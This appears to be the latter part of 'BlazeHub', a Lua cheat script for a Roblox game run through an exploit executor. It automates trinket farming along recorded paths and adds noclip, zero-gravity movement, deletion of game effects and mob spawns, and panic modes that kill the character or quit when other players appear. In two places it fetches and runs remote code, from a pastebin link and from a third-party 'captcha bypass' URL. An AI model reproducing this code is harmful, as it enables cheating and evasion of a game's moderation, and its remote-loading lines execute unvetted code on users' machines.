                        game.Players.LocalPlayer.Character.Torso.Anchored = false 
                        tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                    end
                end
            end
        end
        game.Workspace.Gravity = 196.2
        ServerHop("Hopping")
    end
})

local anti_frost = FarmingSection:AddToggle({
Name = "Anti Frostbite",
Flag = "Anti_Frostbite",
Callback = function()
    if library.Flags["Anti_Frostbite"] then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v.Name == "Frostbitten" then
                v:Destroy()
            end
        end
    end
end
})


local destroy_spawns = FarmingSection:AddButton({
    Name = "Destroy Mob Spawns",
    Callback = function() 
        game:GetService("Workspace").MonsterSpawns.Triggers:Destroy()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BlazeHub",
            Text = "Successfully deleted all mob spawns"
        })
    end
})


local panic_mode = section2:AddToggle({
    Name = "Panic Mode",
    Flag = "Panic_Mode",
})

local true_panic_mode = section2:AddToggle({
    Name = "True Panic Mode",
    Flag = "True_Panic_Mode",
    Callback = function(a)
        if #plrList == 0 then        
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "BlazeHub",
                Text = "No players in list! (use copy plr list button)"
            })
        end
    end
})

local log_instead = section2:AddToggle({
    Name = "Log Instead of Reset",
    Flag = "Log_Mode"
})

local copy_playerboard = FarmingSection:AddButton({
    Name = "Copy Plr List for True Panic",
    Callback = function() 
        for i,v in pairs(game.Players:GetChildren()) do
            table.insert(plrList, v.Name)
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "BlazeHub",
                Text = "Successfully added player list"
            })
        end
    end
})

local add_item = section3:AddTextbox({
    Name = "Add item to drop list",
    Callback = function(a) 
        for i,v in pairs(autoDropItems) do
            if v == a then return end
        end
        table.insert(autoDropItems, a)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BlazeHub",
            Text = "Successfully added to list"
        })
    end,
    Placeholder = "Add Item Here"
})

local remove_item = section3:AddTextbox({
    Name = "Remove from drop list",
    Callback = function(a) 
        for i,v in pairs(autoDropItems) do
            if v == a then
                table.remove(autoDropItems, i)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "BlazeHub",
                    Text = "Successfully removed from list"
                })
            end
        end
    end,
    Placeholder = "Add Item Here"
})

local auto_drop = section3:AddToggle({
    Name = "AutoDrop",
    Flag = "Auto_Drop"
})



autodrop_list_button = section3:AddButton({
    Name = "Check AutoDrop List (F9)",
    Callback = function()
        for i,v in pairs(autoDropItems) do
            print("AUTO DROP LIST: "..v)
        end
    end
})

local save_path = section4:AddTextbox({
    Name = "Save path as",
    Placeholder = "",
    Callback = function(a)
        local stuff = syn.crypt.encrypt(placeholder, "joy")
        writefile("BlazeHub/Paths/"..tostring(a)..".txt", stuff)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BlazeHub",
            Text = "Successfully saved path"
        })
    end
})

local load_path = section4:AddTextbox({
    Name = "Load path as",
    Placeholder = "",
    Callback = function(a)
        local stuff = readfile("BlazeHub/Paths/"..tostring(a)..".txt")
        serverhopTable.path = a
        placeholder = syn.crypt.decrypt(stuff, "joy")
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BlazeHub",
            Text = "Successfully loaded path"
        })
    end
})


local keybind1 = section4:AddKeybind({
    Name = "Add Point",
    Value = Enum.KeyCode.E,
    Pressed = function() 
        if library.Flags["Path_Keybinds"] then
            local line
            if not game.Workspace:FindFirstChild("folderDubs") then
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            if not game.Workspace:FindFirstChild("Lines") then
                lines = Instance.new("Folder", game.Workspace)
                lines.Name = 'Lines'
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) 
            sphere.Shape = Enum.PartType.Ball
            sphere.Anchored = true
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
            sphere.Parent = game.Workspace.folderDubs 
            sphere.Material = Enum.Material.Neon
            table.insert(spheres, sphere.Position)
            if count2 == 0 then
                wait()
            else
                line = Instance.new("Part")
                line.Size = Vector3.new(0.1, 0.1, (spheres[#spheres] - spheres[#spheres - 1]).Magnitude)
                line.Anchored = true
                line.CanCollide = false
                line.Parent = lines
                line.Material = Enum.Material.Neon
                local center = (spheres[#spheres] + spheres[#spheres - 1])/2
                line.CFrame = CFrame.new(center, spheres[#spheres])
            end
            count2 = count2 + 1
            local folderForDubs = folderDubs:GetChildren()
            placeholder = placeholder..tostring(sphere.Position.x).." "..tostring(sphere.Position.y).." "..tostring(sphere.Position.z).." "
            folderCopy = folderDubs:Clone()
            lineCopy = lines:Clone()
            spheresCopy = spheres
            table.insert(savePoints, count2, folderCopy)
            table.insert(fileSavePoints, count2, placeholder)
            table.insert(lineSaves, count2, lineCopy)
            local overlap = OverlapParams.new()
            overlap.FilterDescendantsInstances = {game.Players.LocalPlayer.Character, game.Workspace.Lines, game.Workspace.folderDubs, game.Workspace.Thrown}
            overlap.FilterType = Enum.RaycastFilterType.Blacklist
            overlap.MaxParts = 1
            local parts = game.Workspace:GetPartsInPart(line, overlap)
            print(parts[1].Parent)
            if #parts == 1 and count2 >= 2 and library.Flags["Noclip_Collision"] then
                count2 = count2 - 1
                folderDubs:Destroy()
                folderDubs = savePoints[count2]:Clone()
                folderDubs.Parent = game.Workspace
                placeholder = fileSavePoints[count2]
                lines:Destroy()
                lines = lineSaves[count2]:Clone()
                lines.Parent = game.Workspace
                table.remove(spheres, count2 + 1)
                print("DEBUG SAVE POINT REVERSION: ",count2)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "BlazeHub",
                    Text = "Cannot place point there due to noclip collision!"
                })
            end
        end
    end
})

local keybind2 = section4:AddKeybind({
    Name = "Add Trinket Wait Point",
    Value = Enum.KeyCode.J,
    Pressed = function(a, b)
        if library.Flags["Path_Keybinds"] then
            print("Another precheck")
            local line
            if not game.Workspace:FindFirstChild("folderDubs") then
                print("FOLDER DEBUG CHECK")
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            if not game.Workspace:FindFirstChild("Lines") then
                lines = Instance.new("Folder", game.Workspace)
                lines.Name = 'Lines'
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
            sphere.Shape = Enum.PartType.Ball -- Make it a sphere
            sphere.Anchored = true
            sphere.Color = Color3.fromRGB(0, 0, 255)
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
            sphere.Parent = game.Workspace.folderDubs -- Parent it
            sphere.Material = Enum.Material.Neon
            table.insert(spheres, sphere.Position)
            if count2 == 0 then
                wait()
            else
                line = Instance.new("Part")
                line.Size = Vector3.new(0.1, 0.1, (spheres[#spheres] - spheres[#spheres - 1]).Magnitude)
                line.Anchored = true
                line.CanCollide = false
                line.Parent = lines
                line.Material = Enum.Material.Neon
                local center = (spheres[#spheres] + spheres[#spheres - 1])/2
                line.CFrame = CFrame.new(center, spheres[#spheres])
            end
            count2 = count2 + 1
            folderCopy = folderDubs:Clone()
            lineCopy = lines:Clone()
            spheresCopy = spheres
            print("DEBUG TYPE CHECK: ",type(count2))
            table.insert(savePoints, count2, folderCopy)
            placeholder = placeholder.."("..tostring(sphere.Position.x).." "..tostring(sphere.Position.y).." "..tostring(sphere.Position.z).." "
            print("DEBUG SAVE POINT REVERSION: ",count2)
            table.insert(fileSavePoints, count2, placeholder)
            table.insert(lineSaves, count2, lineCopy)
            local overlap = OverlapParams.new()
            overlap.FilterDescendantsInstances = {game.Players.LocalPlayer.Character, game.Workspace.Lines, game.Workspace.folderDubs, game.Workspace.Thrown}
            overlap.FilterType = Enum.RaycastFilterType.Blacklist
            overlap.MaxParts = 1
            local parts = game.Workspace:GetPartsInPart(line, overlap)
            if #parts == 1 and count2 >= 2 and library.Flags["Noclip_Collision"] then
                count2 = count2 - 1
                folderDubs:Destroy()
                folderDubs = savePoints[count2]:Clone()
                folderDubs.Parent = game.Workspace
                placeholder = fileSavePoints[count2]
                lines:Destroy()
                lines = lineSaves[count2]:Clone()
                lines.Parent = game.Workspace
                table.remove(spheres, count2 + 1)
                print("DEBUG SAVE POINT REVERSION: ",count2)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "BlazeHub",
                    Text = "Cannot place point there due to noclip collision!"
                })
            end
        end
    end
})


local keybind5 = section4:AddKeybind({
    Name = "Add Trinket Loot Point",
    Value = Enum.KeyCode.K,
    Pressed = function(a, b)
        if library.Flags["Path_Keybinds"] then
            print("Another precheck")
            local line
            if not game.Workspace:FindFirstChild("folderDubs") then
                print("FOLDER DEBUG CHECK")
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            if not game.Workspace:FindFirstChild("Lines") then
                lines = Instance.new("Folder", game.Workspace)
                lines.Name = 'Lines'
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
            sphere.Shape = Enum.PartType.Ball -- Make it a sphere
            sphere.Anchored = true
            sphere.Color = Color3.fromRGB(0, 255, 0)
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
            sphere.Parent = game.Workspace.folderDubs -- Parent it
            sphere.Material = Enum.Material.Neon
            table.insert(spheres, sphere.Position)
            if count2 == 0 then
                wait()
            else
                local line = Instance.new("Part")
                line.Size = Vector3.new(0.1, 0.1, (spheres[#spheres] - spheres[#spheres - 1]).Magnitude)
                line.Anchored = true
                line.CanCollide = false
                line.Parent = lines
                line.Material = Enum.Material.Neon
                local center = (spheres[#spheres] + spheres[#spheres - 1])/2
                line.CFrame = CFrame.new(center, spheres[#spheres])

            end
            count2 = count2 + 1
            folderCopy = folderDubs:Clone()
            lineCopy = lines:Clone()
            spheresCopy = spheres
            print("DEBUG TYPE CHECK: ",type(count2))
            table.insert(savePoints, count2, folderCopy)
            placeholder = placeholder..")"..tostring(sphere.Position.x).." "..tostring(sphere.Position.y).." "..tostring(sphere.Position.z).." "
            print("DEBUG SAVE POINT REVERSION: ",count2)
            table.insert(fileSavePoints, count2, placeholder)
            table.insert(lineSaves, count2, lineCopy)
            local overlap = OverlapParams.new()
            overlap.FilterDescendantsInstances = {game.Players.LocalPlayer.Character, game.Workspace.Lines, game.Workspace.folderDubs, game.Workspace.Thrown}
            overlap.FilterType = Enum.RaycastFilterType.Blacklist
            overlap.MaxParts = 1
            local parts = game.Workspace:GetPartsInPart(line, overlap)
            if #parts == 1 and count2 >= 2 and library.Flags["Noclip_Collision"] then
                count2 = count2 - 1
                folderDubs:Destroy()
                folderDubs = savePoints[count2]:Clone()
                folderDubs.Parent = game.Workspace
                placeholder = fileSavePoints[count2]
                lines:Destroy()
                lines = lineSaves[count2]:Clone()
                lines.Parent = game.Workspace
                table.remove(spheres, count2 + 1)
                print("DEBUG SAVE POINT REVERSION: ",count2)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "BlazeHub",
                    Text = "Cannot place point there due to noclip collision!"
                })
            end
        end
    end
})

local keybind5 = section4:AddKeybind({
    Name = "Add NoClip Point",
    Value = Enum.KeyCode.U,
    Pressed = function(a, b)
        if library.Flags["Path_Keybinds"] then
            print("Another precheck")
            local line
            if not game.Workspace:FindFirstChild("folderDubs") then
                print("FOLDER DEBUG CHECK")
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            if not game.Workspace:FindFirstChild("Lines") then
                lines = Instance.new("Folder", game.Workspace)
                lines.Name = 'Lines'
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
            sphere.Shape = Enum.PartType.Ball -- Make it a sphere
            sphere.Anchored = true
            sphere.Color = Color3.fromRGB(255, 0, 0)
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
            sphere.Parent = game.Workspace.folderDubs -- Parent it
            sphere.Material = Enum.Material.Neon
            table.insert(spheres, sphere.Position)
            if count2 == 0 then
                wait()
            else
                local line = Instance.new("Part")
                line.Size = Vector3.new(0.1, 0.1, (spheres[#spheres] - spheres[#spheres - 1]).Magnitude)
                line.Anchored = true
                line.CanCollide = false
                line.Parent = lines
                line.Material = Enum.Material.Neon
                local center = (spheres[#spheres] + spheres[#spheres - 1])/2
                line.CFrame = CFrame.new(center, spheres[#spheres])

            end
            count2 = count2 + 1
            folderCopy = folderDubs:Clone()
            lineCopy = lines:Clone()
            spheresCopy = spheres
            print("DEBUG TYPE CHECK: ",type(count2))
            table.insert(savePoints, count2, folderCopy)
            placeholder = placeholder.."_"..tostring(sphere.Position.x).." "..tostring(sphere.Position.y).." "..tostring(sphere.Position.z).." "
            print("DEBUG SAVE POINT REVERSION: ",count2)
            table.insert(fileSavePoints, count2, placeholder)
            table.insert(lineSaves, count2, lineCopy)
        end
    end
})

local keybind3 = section4:AddKeybind({
    Name = "Undo Last Point",
    Value = Enum.KeyCode.T,
    Pressed = function(a, b) 
        if library.Flags["Path_Keybinds"] then
            count2 = count2 - 1
            folderDubs:Destroy()
            print("undo check")
            folderDubs = savePoints[count2]:Clone()
            print("undo check2")
            folderDubs.Parent = game.Workspace
            print("undo check3")
            placeholder = fileSavePoints[count2]
            print("undo check3")
            lines:Destroy()
            print("undo check4")
            lines = lineSaves[count2]:Clone()
            print("undo check5")
            lines.Parent = game.Workspace
            table.remove(spheres, count2 + 1)
            print("DEBUG SAVE POINT REVERSION: ",count2)
        end
    end
})

local keybind4 = section4:AddKeybind({
    Name = "Hide Gui",
    Value = Enum.KeyCode.P,
    Pressed = function(a, b) 
        if game:GetService("CoreGui")["     "].main.Visible == true then
            game:GetService("CoreGui")["     "].main.Visible = false
        else
            game:GetService("CoreGui")["     "].main.Visible = true
        end
    end
})

local destroy_path = section4:AddButton({
    Name = "Destroy Path",
    Callback = function() 
        folderDubs:Destroy()
        folderDubs = Instance.new("Folder", game.Workspace)
        folderDubs.Name = "folderDubs"
        placeholder = ""
        first2 = true
        count = 0
        count2 = 0
        lines:Destroy()
        spheres = {}
    end
})

section4:AddToggle({
    Name = "Noclip Collision Detection",
    Flag = "Noclip_Collision"
})

local keybinds_enabled = section4:AddToggle({
    Name = "Enable Path Keybinds",
    Flag = "Path_Keybinds"
})

local safe_server = section5:AddToggle({
    Name = "Server Hop Variant (WIP)",
    Flag = "Server_Hop"
})

local speed = section5:AddSlider({
    Name = "Speed",
    Value = 50,
    Min = 50,
    Max = 150
})

local trinket_wait = section5:AddSlider({
    Name = "Trinket Wait Times",
    Value = 1,
    Min = 1,
    Max = 10
})

local loot_cycle = section5:AddSlider({
    Name = "Loot Cycle Wait Times",
    Value = 1,
    Min = 1,
    Max = 50
})

local bot_checkbox = section5:AddToggle({
    Name = "Bot Running",
    Flag = "Bot_Running",
    Callback = function()
        if library.Flags["Bot_Running"] then
            toggle = false
            autoPickup()
            local newCoords = {}
            local CFrames = {} 
            local stopPoints = {}
            local stopPoints2 = {}
            local lootPoints = {}
            local lootPoints2 = {}
            local noclipPoints = {}
            local noclipPoints2 = {}
            if string.len(placeholder) == 0 then return end
            local stuff = placeholder
            spawn(function()
                loadstring(game:HttpGet(("https://pastebin.com/raw/ERDp2x5W"),true))()
            end)
            for word in stuff:gmatch("(.-)".." ") do  
                count = count + 1
                print("COUNT CHECK: ",count)
                if word:sub(1, 1) == "(" then
                    print("STOP POINT FOUND: ",count)
                    table.insert(stopPoints, count)
                    table.insert(newCoords, string.sub(word, 2))
                elseif word:sub(1,1) == ")" then
                    print("LOOT POINT FOUND: ",count)
                    table.insert(lootPoints, count)
                    table.insert(newCoords, string.sub(word, 2))
                elseif word:sub(1,1) == "_" then
                    table.insert(noclipPoints, count)
                    table.insert(newCoords, string.sub(word, 2))
                else
                    table.insert(newCoords, word)
                end
            end
            for i,v in pairs(newCoords) do
                if (i+2)%3 == 0 then
                    table.insert(CFrames, CFrame.new(v, newCoords[i+1], newCoords[i+2]))
                end
            end
            for i,v in pairs(stopPoints) do
                if (v + 2) % 3 == 0 then
                    table.insert(stopPoints2, v)
                end
            end
            for i,v in pairs(lootPoints) do
                if (v + 2) % 3 == 0 then
                    table.insert(lootPoints2, v)
                end
            end
            for i,v in pairs(noclipPoints)do
                if (v + 2) % 3 == 0 then
                    table.insert(noclipPoints2, v)
                end
            end
            while true do
                if not library.Flags["Bot_Running"] then return end
                if exCount == 2 then return end
                
                game.Workspace.Gravity = 0
                for i,v in pairs(CFrames) do
                    if not library.Flags["Bot_Running"] then return end
                    if exCount == 2 then return end
                    if first then
                        local time = calculateTime(speed:Get(), game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(v.x, v.y, v.z)))
                        tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                        game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "0"
                        wait(time)
                        for i2,vd in pairs(stopPoints2) do
                            if i == (vd+2)/3 then
                                game.Players.LocalPlayer.Character.Torso.Anchored = true
                                wait(trinket_wait:Get())
                                game.Players.LocalPlayer.Character.Torso.Anchored = false
                            end
                        end 
                        for i2, vd in pairs(lootPoints2) do
                            if i == (vd+2)/3 then
                                game.Players.LocalPlayer.Character.Torso.Anchored = true
                                game.Workspace:WaitForChild("Part", 5)
                                game.Players.LocalPlayer.Character.Torso.Anchored = false
                                for i3,v3 in pairs(game.Workspace:GetChildren()) do
                                    if v3.Name == "Part" and v3:FindFirstChild("ID") and game.Players.LocalPlayer:DistanceFromCharacter(v3.Position) <= 200 then
                                        local time = calculateTime(speed:Get(), game.Players.LocalPlayer:DistanceFromCharacter(v3.Position)) 
                                        tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v3.CFrame}):Play()
                                        wait(time)
                                    end
                                end
                                local time = calculateTime(speed:Get(), game.Players.LocalPlayer:DistanceFromCharacter(v.Position)) 
                                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                            end
                        end
                        for i2, vd in pairs(noclipPoints2) do
                            if i == ((vd+2)/3) - 1 then
                                local head, torso, name_part_head, character, humanoid_root_part, humanoid
                                local original_velocity
                                local player = game.Players.LocalPlayer
                                local humanoid_root_part = player.Character.HumanoidRootPart
                                local last_noclip_time = tick()
                                
                                local con = game:GetService("RunService").Stepped:Connect(function()
                                        character = player.Character
                                
                                        if character then
                                            humanoid, humanoid_root_part = character:FindFirstChildOfClass("Humanoid"), character:FindFirstChild("HumanoidRootPart")
                                            head, torso = character:FindFirstChild("Head"), character:FindFirstChild("Torso")
                                
                                            if humanoid and humanoid_root_part and head and torso then
                                                local fake_humanoid = character:FindFirstChild("FakeHumanoid", true)
                                
                                                if fake_humanoid then
                                                        last_noclip_time = tick()
                                
                                                        local name_part = fake_humanoid.Parent
                                
                                                        if name_part then
                                                            name_part_head = name_part:FindFirstChild("Head")
                                
                                                            if name_part_head then
                                                                torso.CanCollide = false
                                                                head.CanCollide = false
                                                                name_part_head.CanCollide = false
                                
                                                                original_velocity = humanoid_root_part.Velocity
                                                                humanoid_root_part.Velocity = Vector3.new(original_velocity.X, 2, original_velocity.Z)
                                
                                                                humanoid.JumpPower = 0
                                                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                local frame = CFrames[i+1]
                                local time = calculateTime(25, game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(frame.x, frame.y, frame.z)))
                                print("Time check: "..time)
                                tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrames[i+1]}):Play()
                                wait(time)
                                con:Disconnect()
                                head.CanCollide = true
                                torso.CanCollide = true
                                humanoid_root_part.Velocity = original_velocity
                                if name_part_head then
                                    name_part_head.CanCollide = true
                                end
                                character.Humanoid.JumpPower = 50
                            end
                        end
                    end
                end
            if not library.Flags["Bot_Running"] then return end
            toggle2 = true
            game.Workspace.Gravity = 196.2
            if iswindowactive() and library.Flags["Auto_Drop"]then
                for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    for i2, v2 in pairs(autoDropItems) do
                        if v.Name == v2 then
                            local remotes = game.ReplicatedStorage.Requests
                            local test1, test2
                            for i,v in pairs(remotes:GetChildren()) do
                                if v:IsA("RemoteFunction") and string.sub(v.Name, 1,4) == "M0ai" then 
                                    if not test1 then
                                        test1 = v 
                                    else
                                        test2 = v 
                                    end
                                end
                            end
                            
                            local args = {v}
                            
                            test1:InvokeServer(unpack(args))
                            test2:InvokeServer(unpack(args))


                        end
                    end
                end
            end
                for i = 1, loot_cycle:Get() * 60 do
                    wait(1)
                    if not library.Flags["Bot_Running"] then return end
                end
            end
        else
            count = 0
            game.Workspace.Gravity = 196.2
            game.Players.LocalPlayer.Character.Torso.Anchored = false
        end
        end
})

section6:AddPersistence({
    Name = "Save Gui Settings",
    SaveCallback = function(a, b)
        local saveTable = {
            plrList, 
            autoDropItems
        }
        local cool = game:GetService("HttpService"):JSONEncode(saveTable)
        writefile("BlazeHub/Configs/"..b..".txt", cool)
    end,
    LoadCallback = function(a, b)
        local thing = readfile("BlazeHub/Configs/"..b..".txt")
        local comedy = game:GetService("HttpService"):JSONDecode(thing)
        plrList = comedy.plrList
        autoDropItems = comedy.autoDropItems
    end
})

local chr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
chr.ChildAdded:Connect(function(child)
    if library.Flags["Anti_Frostbite"] then
        print("Toggle works")
        if child.Name == "Frostbitten" then
            child:Destroy()
            print("Frostbite deletion")
        end
    end
end)

local connection2 = game.Players.PlayerRemoving:Connect(function()
    if library.Flags["Panic_Mode"] then
        if library.Flags["Log_Mode"] then
            game:Shutdown()
        else
            repeat wait() until not game.Players.LocalPlayer.Character:FindFirstChild("Danger")
            game.Players.LocalPlayer.Character:BreakJoints()
            bot_checkbox:RawSet(false)
            panic_mode:RawSet(false)
            game.Workspace.Gravity = 196.2
        end
    end
end)

game.Players.PlayerAdded:Connect(function(plr)
    if library.Flags["True_Panic_Mode"] then
        local check
        for i,v in pairs(plrList) do
            if v ~= plr.Name then
                check = true
            end
        end
        if check then
            if library.Flags["Log_Mode"] then
                game:Shutdown()
            else
                repeat wait() until not game.Players.LocalPlayer.Character:FindFirstChild("Danger")
                game.Players.LocalPlayer.Character:BreakJoints()
                bot_checkbox:RawSet(false)
                true_panic_mode:RawSet(false)
                game.Workspace.Gravity = 196.2
            end
        end
    end
end)

spawn(function()
    while true do
        if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then 
            bot_checkbox:RawSet(false) count = 0  
            game.Workspace.Gravity = 196.2 
        end
        wait()
    end
end)

loadstring(game:HttpGet("http://www.archgay.xyz/captchabypassrogue.lua"))()
